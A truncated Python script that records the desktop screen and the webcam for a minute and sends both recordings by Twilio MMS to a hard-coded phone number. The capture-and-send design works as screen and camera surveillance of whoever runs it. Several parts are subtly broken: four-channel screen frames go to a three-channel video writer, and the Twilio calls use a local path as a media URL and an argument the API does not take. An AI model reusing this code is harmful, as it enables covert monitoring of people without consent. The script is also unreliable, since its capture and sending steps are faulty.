import mss
import cv2
import numpy as np
import time
from twilio.rest import Client

# Your Twilio account SID and AUTH token
account_sid = "YOUR_ACCOUNT_SID"
auth_token = "YOUR_AUTH_TOKEN"

# Your Twilio phone number and the destination phone number
twilio_number = "+15005550006"
destination_number = "+12023041208"

# Define the codec and create two video writer objects
fourcc = cv2.VideoWriter_fourcc(*'mp4v')
screen_writer = cv2.VideoWriter('screen_capture.mp4', fourcc, 30, (1920, 1080))
webcam_writer = cv2.VideoWriter('webcam_capture.mp4', fourcc, 30, (640, 480))

# Start a screen-capture session
with mss.mss() as sct:
    monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}

    # Open a connection to the webcam
    cap = cv2.VideoCapture(0)

    start_time = time.time()

    # Capture screen frames and webcam frames, and write them to the video files
    while True:
        # Capture the desktop screen
        sct_img = sct.grab(monitor)
        screen_frame = np.array(sct_img)
        screen_writer.write(screen_frame)

        # Capture the webcam feed
        ret, webcam_frame = cap.read()
        webcam_writer.write(webcam_frame)

        # Break the loop if the 'q' key is pressed or one minute has passed
        if cv2.waitKey(1) & 0xFF == ord('q') or time.time() - start_time > 60:
            break

    # Release the video writer objects
    screen_writer.release()
    webcam_writer.release()

    # Release the webcam connection
    cap.release()

    # Destroy all windows
    cv2.destroyAllWindows()

    # Send the MP4 files as MMS using Twilio
    client = Client(account_sid, auth_token)

    with open("screen_capture.mp4", "rb") as screen_file:
        client.messages.create(
            to=destination_number,
            from_=twilio_number,
            body="Screen Capture",
            media_url=["screen_capture.mp4"],
            media={"screen_capture.mp4": screen_file.read()}
        )

    with open("webcam_capture.mp4", "rb") as webcam_file:
        client.messages.create(
            to=destination_number,
            from_=twilio_number,
            body="Webcam Capture",
            media_url=["webcam_capture.mp4"],
            media={"webcam_
